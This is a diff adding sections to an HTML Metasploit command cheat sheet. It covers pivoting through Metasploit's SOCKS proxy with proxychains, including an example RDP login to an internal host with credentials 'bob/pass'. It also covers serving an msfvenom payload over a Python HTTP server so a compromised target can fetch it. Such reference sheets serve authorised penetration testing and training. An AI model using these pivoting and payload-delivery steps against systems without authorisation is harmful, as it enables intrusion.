@@ -678,6 +678,36 @@ setg Proxies socks5:127.0.0.1:9050</div>
     </div>
   </div>
 </div>
+
+<div class="cmd-block">
+  <div class="cmd-block-header hdr-red"><span class="icon">🧦</span>SOCKS proxy session — routing external tools through MSF</div>
+  <table class="cmd-table">
+    <tr><td class="c1">use auxiliary/server/socks_proxy</td><td class="c2">Load the SOCKS proxy server module</td><td class="c3">use auxiliary/server/socks_proxy</td></tr>
+    <tr><td class="c1">set SRVPORT 1080</td><td class="c2">Set the local port MSF will listen on for SOCKS connections</td><td class="c3">set SRVPORT 1080</td></tr>
+    <tr><td class="c1">set VERSION 5</td><td class="c2">Use SOCKS5 (matches proxychains convention used elsewhere on this sheet)</td><td class="c3">set VERSION 5</td></tr>
+    <tr><td class="c1">run -j</td><td class="c2">Start the SOCKS proxy as a background job</td><td class="c3">run -j</td></tr>
+    <tr><td class="c1">cp /etc/proxychains4.conf .</td><td class="c2">Copy the config locally so you can point it at the MSF proxy without touching the system-wide file</td><td class="c3">cp /etc/proxychains4.conf .</td></tr>
+    <tr><td class="c1">edit local proxychains4.conf</td><td class="c2">Update the port at the bottom of the copied file to match SRVPORT</td><td class="c3">socks5 127.0.0.1 1080</td></tr>
+    <tr><td class="c1">proxychains -f &lt;path&gt; &lt;cmd&gt;</td><td class="c2">Route any external tool through the copied config with -f</td><td class="c3">proxychains -f ./proxychains4.conf xfreerdp3 /v:10.10.20.5 /u:bob /p:pass</td></tr>
+  </table>
+  <div style="padding: 0 12px 12px;">
+    <div class="step-cmd">use auxiliary/server/socks_proxy
+set SRVPORT 1080
+set VERSION 5
+run -j
+
+cp /etc/proxychains4.conf .
+# edit the socks5 line at the bottom of the local copy to: socks5 127.0.0.1 1080
+
+proxychains -f ./proxychains4.conf xfreerdp3 /v:10.10.20.5 /u:bob /p:pass /cert:ignore</div>
+  </div>
+  <div style="padding: 0 12px 12px;">
+    <div class="callout callout-tip" style="margin-bottom:0;">
+      <span class="callout-icon">💡</span>
+      <div>Using a local copy of proxychains4.conf (instead of editing <code>/etc/proxychains4.conf</code> directly) means you can point different sessions/pivots at different ports without stepping on your system-wide config — just pass <code>-f &lt;path&gt;</code> to proxychains and it'll use that copy instead.</div>
+    </div>
+  </div>
+</div>
       
       <div class="cmd-block">
         <div class="cmd-block-header hdr-red"><span class="icon">🧰</span>Useful auxiliary/scanner modules</div>
@@ -866,6 +896,23 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <div class="callout callout-warn" style="margin-bottom:0;">
             <span class="callout-icon">⚠</span>
             <div>Set a matching listener (<code>exploit/multi/handler</code> with the same payload/LHOST/LPORT) before executing the payload on target, or the callback has nothing to connect to.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">📡</span>Python HTTP server — delivering the payload</div>
+        <table class="cmd-table">
+          <tr><td class="c1">python3 -m http.server &lt;port&gt;</td><td class="c2">Serve the current directory over HTTP so a compromised box can pull the payload down</td><td class="c3">python3 -m http.server 8080</td></tr>
+          <tr><td class="c1">http://&lt;redirector_ip&gt;:&lt;port&gt;</td><td class="c2">From the target, browse to (or download from) this URL to reach the file</td><td class="c3">http://192.168.1.100:8080</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="step-cmd">python3 -m http.server 8080</div>
+        </div>
+        <div style="padding: 0 12px 12px;">
+          <div class="callout callout-info" style="margin-bottom:0;">
+            <span class="callout-icon">ℹ</span>
+            <div>Run this from the same directory as the msfvenom output file. Navigate to <code>http://&lt;redirector ip&gt;:&lt;port&gt;</code> from the target (browser, <code>curl</code>, <code>Invoke-WebRequest</code>, etc.) and download the payload you generated — this is usually easier than trying to upload a file directly through a limited shell.</div>
           </div>
         </div>
       </div>
